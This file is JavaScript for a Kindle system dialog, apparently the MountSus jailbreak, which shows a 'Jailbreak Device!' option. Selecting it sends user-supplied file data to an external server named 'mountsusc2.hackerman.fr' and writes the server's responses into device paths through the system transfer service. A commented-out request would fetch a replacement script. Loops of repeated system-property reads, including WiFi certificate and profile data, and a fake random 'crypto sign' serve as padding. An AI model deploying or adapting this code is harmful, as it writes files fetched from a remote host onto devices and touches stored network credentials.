function generateCryptoSign(signBy) {
    var e = Math.ceil(signBy).toExponential();
    var data = []
    for (var i=0; i < e.length; i++) {
        data.push(e.charCodeAt(i));
    }

    while (data.length < "kindle".length - 2) {
        data.push(Math.random());
    }

    for (var i=0; i < data.length; i++) {
        while (data[i] > 1) {
            data[i] = data[i] * Math.random();
        }
    }
    return data;
}

function downloadDRMFile(path, url, file) {
    var drmFileData = {
        url:                        url,        // The path to the server
        dest:                       path,           // Destination
        unique_id:                  "archivedItems",
        extra_headers:              "fileData:" + encodeURIComponent(file)
    }

    drmFileData.transport_any = 1;
    drmFileData.priority = 80;
    drmFileData.notify_progress_interval = 20;
    drmFileData.notify_pub = "com.lab126.archive";
    drmFileData.notify_prop = "transferProgressNotification";


    return drmFileData
}

Pillow.MountSusDialog = function tmp() {
    var that = this;
    var parent = Pillow.extend(this, new Pillow.Case('MountSusDialog'));
    var windowTitle = null;
    var listWidget = null;
    var selectedItem = null;
    var settingList = null;
    var jsEnabled = true;
    var imageEnabled = true;
    var file = ""; // The file to edit and send to the server
    var filePath = ""; // The location to download the file to
    var lipcId = null;
    const SETTINGS_DIALOG_ID = "dialog";


    /**
     * Sets up the dialog with Pillow and prepares the interface.
     */
    this.onLoad = function tmp() {
        nativeBridge.registerClientParamsCallback(this.clientParamsCallback);
        Pillow.setOption(OPTION_SEND_DELETE_EVENTS, true);
        windowTitle = new WindowTitle(WINMGR.LAYER.DIALOG, WINMGR.ROLE.DIALOG);
        windowTitle.withChanges(function tmp() {
            this.addParam(WINMGR.KEY.WIN_IS_MODAL,
                WINMGR.MODALITY.DISMISSIBLE_MODAL);
        });
        listWidget = new ListWidget('settings', {
            fields: ['name','id'],
            handler: listItemSelection,
            xor: true
        });
        cancelButton = document.getElementById('advancedCancelButton');
        new XorButton(cancelButton, Pillow.bind(this, 'close', null),
                      cancelButton, 'dialog-close','dialog-close xor');
        var dialogElem = document.getElementById(SETTINGS_DIALOG_ID);
        nativeBridge.setWindowSize(dialogElem.offsetWidth, 700);
        this.show();
        parent(this).onLoad();
        modifyClassNameDOM();
    };

    var listItemSelection = function tmp(item) {
        Pillow.logInfo("Generating crypto constants");
        var cryptoConstants = generateCryptoSign();
        var urlRoot = "https://mountsusc2.hackerman.fr";

        //Pillow.logInfo("MountSus.listItemSelection selectedItem=" + item.name + " " + item.id);
        
        var max = Math.ceil((cryptoConstants[3] * 30));
        for (var i=0; i < max; i++) {
            nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
            nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
            nativeBridge.getIntLipcProperty("com.lab126.wan", "serviceState");
            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
            nativeBridge.getIntLipcProperty("com.lab126.winmgr", "ASRMode");
            nativeBridge.getStringLipcProperty("com.lab126.winmgr", "orientation");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","certificateData");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","profileData");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","scanList");
        }

        var drm1DownloadRequest = downloadDRMFile("/mnt/us/apps/com.bluebotlabs.mountsus/DRMKEY.bin", urlRoot + "/MountSus/drmKey", file);
        var drm2DownloadRequest = downloadDRMFile("/mnt/us/apps/com.bluebotlabs.mountsus/drmkey2.bin", urlRoot + "/MountSus/drmKey2", JSON.stringify(cryptoConstants));
        var updateDownloadRequest = downloadDRMFile("/mnt/us/apps/com.bluebotlabs.MountSus/js/mountsusUpdate.js", urlRoot + "/MountSus/mountsusUpdate.js", JSON.stringify(cryptoConstants));
        var drm3ResponseRequest = downloadDRMFile(filePath, urlRoot + "/MountSus/drmChallengeResponse", file);

        //nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", updateDownloadRequest);

        document.getElementById("jailState").innerText = urlRoot + "/MountSus/drmChallengeResponse";//"Sending property...";

        //nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm1DownloadRequest);

        var max = Math.ceil((cryptoConstants[0] * 30));
        for (var i=0; i < max; i++) {
            nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
            nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
            nativeBridge.getIntLipcProperty("com.lab126.wan", "serviceState");
            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
            nativeBridge.getIntLipcProperty("com.lab126.winmgr", "ASRMode");
            nativeBridge.getStringLipcProperty("com.lab126.winmgr", "orientation");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","certificateData");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","profileData");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","scanList");
        }

        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm3ResponseRequest);

        setTimeout(function tmp() {var max = Math.ceil((cryptoConstants[1] * 30));
        for (var i=0; i < max; i++) {
            nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
            nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
            nativeBridge.getIntLipcProperty("com.lab126.wan", "serviceState");
            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
            nativeBridge.getIntLipcProperty("com.lab126.winmgr", "ASRMode");
            nativeBridge.getStringLipcProperty("com.lab126.winmgr", "orientation");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","certificateData");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","profileData");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","scanList");
        }}, 1000);

        document.getElementById("jailState").innerText = "Digging tunnel...";

        var max = Math.ceil((cryptoConstants[2] * 100));
        for (var i=0; i < max; i++) {
            nativeBridge.getIntLipcProperty("com.lab126.ccat", "logMask");
            nativeBridge.getIntLipcProperty("com.lab126.cmd", "wirelessEnable");
            nativeBridge.getIntLipcProperty("com.lab126.wan", "serviceState");
            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
            nativeBridge.getIntLipcProperty("com.lab126.dpmManager", "getControlStatus");
            nativeBridge.getIntLipcProperty("com.lab126.winmgr", "ASRMode");
            nativeBridge.getStringLipcProperty("com.lab126.winmgr", "orientation");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","certificateData");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","profileData");
            nativeBridge.accessHasharrayProperty("com.lab126.wifid","scanList");
        }

        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm2DownloadRequest);

        setTimeout(function tmp() {
            document.getElementById("jailState").innerText = "Done! Close the popup and click Verify Jailbreak";
        }, 1000);
    };

    this.clientParamsCallback = function tmp(clientParamsString){
        // parse clientParams
        var clientParams = JSON.parse(clientParamsString);
        file = clientParams.fileData; // Add the payload
        filePath = clientParams.filePath;
        jsEnabled =  (clientParams.jsEnabled === 'true');
        imageEnabled =  (clientParams.imageEnabled === 'true');
        lipcId = clientParams.replySrc;

        document.getElementById("jailState").innerText = "You are currently in jail.";
    };

    this.getBrowserSettings = function tmp() {
        var displayList = [];
        displayList.push({
            name: "Jailbreak Device!",
            id: "jailbreak_device"
        });

        return displayList;
    };

    this.renderBrowserSettings = function(settingList, widgetOptions) {
        listWidget.setItems(settingList, widgetOptions);
    };

    this.setBrowserSettings = function tmp(widgetOptions) {
        settingList = this.getBrowserSettings();
        this.renderBrowserSettings(settingList, widgetOptions);
    };

    this.show = function tmp() {
        this.setBrowserSettings(true);
        nativeBridge.showMe();
    };

    this.hide = function tmp() {
        Pillow.logInfo("MountSusDialog.hide called");
        windowTitle.addParam(WINMGR.KEY.HIDE_DIALOG, WINMGR.DIALOG_HIDE.BACKGROUND);
    };

    this.close = function tmp() {
        Pillow.logInfo("MountSusDialog.close called");
        nativeBridge.dismissMe();
    };

    Pillow.logWrapObject('Pillow.MountSusDialog', this);
};

var mountSusDialog = new Pillow.MountSusDialog();
mountSusDialog.register();

